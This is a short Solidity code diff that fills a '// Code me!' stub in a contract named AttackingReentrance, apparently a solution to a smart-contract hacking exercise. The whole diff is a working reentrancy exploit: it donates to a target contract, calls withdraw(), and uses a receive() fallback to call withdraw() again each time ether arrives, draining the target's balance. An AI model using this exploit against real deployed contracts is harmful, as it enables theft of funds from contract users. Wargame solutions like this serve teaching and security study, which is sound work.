@@ -10,6 +10,19 @@ contract AttackingReentrance {
     }
 
     function hackContract() external {
-        // Code me!
+        (bool s, ) = contractAddress.call{value: address(this).balance}(
+            abi.encodeWithSignature("donate(address)", address(this))
+        );
+        require(s, "low-level call failed");
+
+        (s, ) = contractAddress.call(abi.encodeWithSignature("withdraw()"));
+        require(s, "low-level call failed");
+    }
+
+    receive() external payable {
+        (bool s, ) = contractAddress.call(
+            abi.encodeWithSignature("withdraw()")
+        );
+        require(s, "low-level call failed");
     }
 }
